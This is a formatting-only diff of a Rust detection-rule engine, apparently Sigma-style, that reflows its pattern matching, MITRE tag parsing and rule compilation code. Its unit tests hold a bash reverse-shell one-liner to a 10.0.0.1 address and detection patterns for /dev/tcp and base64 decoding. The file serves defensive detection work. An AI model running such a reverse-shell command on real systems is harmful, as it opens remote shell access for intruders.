@@ -82,7 +82,11 @@ impl ValuePattern {
         match &self.kind {
             MatchKind::Regex(re) => re.is_match(haystack),
             other => {
-                let hay = if self.cased { haystack.to_string() } else { haystack.to_ascii_lowercase() };
+                let hay = if self.cased {
+                    haystack.to_string()
+                } else {
+                    haystack.to_ascii_lowercase()
+                };
                 let needle = &self.needle;
                 match other {
                     MatchKind::Equals => &hay == needle,
@@ -197,7 +201,10 @@ fn parse_mitre(tags: &[String]) -> (Option<String>, Option<String>) {
         // Technique ids look like t1059 or t1059.004.
         if technique.is_none()
             && suffix.starts_with('t')
-            && suffix[1..].chars().next().is_some_and(|c| c.is_ascii_digit())
+            && suffix[1..]
+                .chars()
+                .next()
+                .is_some_and(|c| c.is_ascii_digit())
         {
             technique = Some(suffix.to_ascii_uppercase());
         } else if tactic.is_none() && !suffix.is_empty() && !suffix.starts_with('t') {
@@ -258,8 +265,16 @@ fn compile_patterns(
     let mut match_null = false;
     let push = |v: &serde_yaml_ng::Value, out: &mut Vec<ValuePattern>| -> Result<()> {
         let s = yaml_scalar(v)?;
-        let needle = if cased { s.clone() } else { s.to_ascii_lowercase() };
-        out.push(ValuePattern { kind: kind_of(&s)?, needle, cased });
+        let needle = if cased {
+            s.clone()
+        } else {
+            s.to_ascii_lowercase()
+        };
+        out.push(ValuePattern {
+            kind: kind_of(&s)?,
+            needle,
+            cased,
+        });
         Ok(())
     };
 
@@ -300,7 +315,12 @@ fn compile_selection_map(map: &serde_yaml_ng::Mapping) -> Result<Vec<FieldMatche
         let field = parts[0].to_ascii_lowercase();
         let mods: Vec<&str> = parts[1..].to_vec();
         let (patterns, require_all, match_null) = compile_patterns(v, &mods)?;
-        matchers.push(FieldMatcher { field, patterns, require_all, match_null });
+        matchers.push(FieldMatcher {
+            field,
+            patterns,
+            require_all,
+            match_null,
+        });
     }
     Ok(matchers)
 }
@@ -361,8 +381,9 @@ impl CompiledRule {
             if name == "condition" {
                 continue;
             }
-            let s = compile_search(val)
-                .with_context(|| format!("rule '{}' search '{}' compile failed", raw.title, name))?;
+            let s = compile_search(val).with_context(|| {
+                format!("rule '{}' search '{}' compile failed", raw.title, name)
+            })?;
             searches.insert(name.clone(), s);
         }
         if searches.is_empty() {
@@ -428,11 +449,19 @@ tags:
 
     #[test]
     fn value_pattern_modifiers_work() {
-        let ends = ValuePattern { kind: MatchKind::EndsWith, needle: "/bash".into(), cased: false };
+        let ends = ValuePattern {
+            kind: MatchKind::EndsWith,
+            needle: "/bash".into(),
+            cased: false,
+        };
         assert!(ends.matches("/usr/bin/bash"));
         assert!(!ends.matches("/usr/bin/dash"));
 
-        let contains = ValuePattern { kind: MatchKind::Contains, needle: "/dev/tcp/".into(), cased: false };
+        let contains = ValuePattern {
+            kind: MatchKind::Contains,
+            needle: "/dev/tcp/".into(),
+            cased: false,
+        };
         assert!(contains.matches("bash -i >& /dev/TCP/10.0.0.1/4444 0>&1"));
 
         let re = ValuePattern {
@@ -449,8 +478,16 @@ tags:
         let m = FieldMatcher {
             field: "commandline".into(),
             patterns: vec![
-                ValuePattern { kind: MatchKind::Contains, needle: "base64".into(), cased: false },
-                ValuePattern { kind: MatchKind::Contains, needle: "decode".into(), cased: false },
+                ValuePattern {
+                    kind: MatchKind::Contains,
+                    needle: "base64".into(),
+                    cased: false,
+                },
+                ValuePattern {
+                    kind: MatchKind::Contains,
+                    needle: "decode".into(),
+                    cased: false,
+                },
             ],
             require_all: true,
             match_null: false,
